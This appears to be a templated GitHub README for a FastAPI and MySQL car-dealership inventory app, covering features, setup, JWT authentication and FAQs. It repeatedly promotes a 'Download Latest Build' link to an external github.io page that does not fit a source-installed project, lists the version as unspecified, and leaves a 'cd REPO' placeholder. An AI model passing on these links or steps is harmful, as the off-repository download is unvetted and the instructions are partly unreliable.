# Apex Auto - Car Dealership Inventory Management System 2026

> **Apex Auto gives dealerships a web-based way to manage vehicle inventory, search available stock, handle purchases, and control administrative tasks across a Python and JavaScript application stack.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/will-hallaed686/apex-auto-inventory-system?style=flat-square)](https://github.com/will-hallaed686/apex-auto-inventory-system)

---

<p align="center">
  <a href="https://will-hallaed686.github.io/apex-auto-inventory-system/">
    <img src="https://img.shields.io/badge/Download-Apex%20Auto%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Auto">
  </a>
</p>

> **[Download Apex Auto](https://will-hallaed686.github.io/apex-auto-inventory-system/)**

---

[Download Latest Build](https://will-hallaed686.github.io/apex-auto-inventory-system/)

---

## Overview

Apex Auto provides dealerships with a shared workspace for finding, arranging, and maintaining vehicle listings. Its inventory tools cover catalog searches, detailed filtering, purchase processing, and automatic quantity updates when stock is sold or replenished.

The platform uses FastAPI for its backend, MySQL for data storage, and a responsive JavaScript single-page frontend styled with Tailwind CSS. Role separation keeps standard inventory browsing distinct from administrator functions, including creating, editing, deleting, and restocking vehicle entries.

---

## Capabilities

- View dealership vehicles in a responsive browser-based catalog
- Find vehicles by searching across multiple inventory fields
- Complete purchases while reducing the related stock count
- Allow administrators to add, update, and delete vehicle records
- Increase available quantities through inventory restocking
- Secure API endpoints with JWT-based authentication
- Enforce distinct user and administrator privileges with role-based access control
- Exchange frontend and backend data through a RESTful API
- Provide frontend and backend test suites created using TDD practices

---

## Getting Started

First, download the repository and move into the project folder:

```bash
git clone https://github.com/will-hallaed686/apex-auto-inventory-system.git
cd REPO
```

Create an isolated Python environment, install the required backend packages, and set up a MySQL database for Apex Auto. Once those steps are complete, launch the FastAPI application through its project entry point:

```bash
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
uvicorn app.main:app --reload
```

PowerShell users can enable the virtual environment with:

```powershell
.venv\Scripts\Activate.ps1
```

After the API has started, load the frontend using the web entry point configured by the project.

---

## Working with the Application

The usual inventory process looks like this:

1. Log in to the web interface.
2. Review the vehicles currently listed in the catalog.
3. Apply search terms and multiple filters to refine the results.
4. Select a vehicle to inspect its availability.
5. Submit a purchase and let the system adjust the stock.
6. If you have administrator privileges, add vehicles, change listings, delete records, or replenish quantities.

When working directly with the API, authenticate to receive a JWT and attach that token to protected REST calls:

```http
Authorization: Bearer <your-jwt-token>
```

While the FastAPI server is active, its configured API documentation may also be available, depending on the routes defined by the application.

---

## Environment Setup

The application needs MySQL connection information along with settings used for authentication. Keep these environment-specific values in a local environment file or deployment configuration instead of placing them directly in source files.

A configuration may follow this structure:

```env
DATABASE_URL=mysql+pymysql://user:password@localhost/apex_auto
JWT_SECRET_KEY=replace-with-a-local-secret
```

Replace the sample values with settings for the environment where Apex Auto is running. Never commit real credentials or other private secrets to the repository.

---

## System Requirements

- A web browser with JavaScript enabled
- A Python version supported by the project dependencies
- FastAPI and the required backend packages
- A running MySQL database server
- Database settings compatible with SQLAlchemy
- Node.js tools when they are needed by the frontend configuration
- Connectivity between the browser, API, and database
- Sufficient storage for application files, database data, and test assets

---

## Frequently Asked Questions

### What type of organization uses Apex Auto?

Apex Auto is built for dealerships and teams that want browser-based vehicle inventory management with different experiences for regular users and administrators.

### How are vehicle listings changed?

An administrator can create new records, modify existing vehicles, remove listings, and add stock through the administrative workflow.

### What should I do if a vehicle cannot be purchased?

Purchasing decreases the available quantity. If no stock remains, inspect the vehicle record or have an administrator replenish it through the restocking process.

### Where do MySQL and authentication values belong?

Place database connection details and authentication configuration in the deployment environment or a local environment file. Avoid hard-coding these settings in the application.

### What authentication method protects the API?

Protected endpoints use JWT authentication. Log in, obtain a token, and send it in the bearer authorization header for subsequent requests.

### What are the first startup checks?

Confirm that the Python packages are installed, MySQL can be reached, the database configuration is accurate, and the API is being started from the correct project directory. The backend and frontend test suites can help locate regressions.

### How do I get the newest build?

Check the project repository and its download link for the latest build and available release information.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
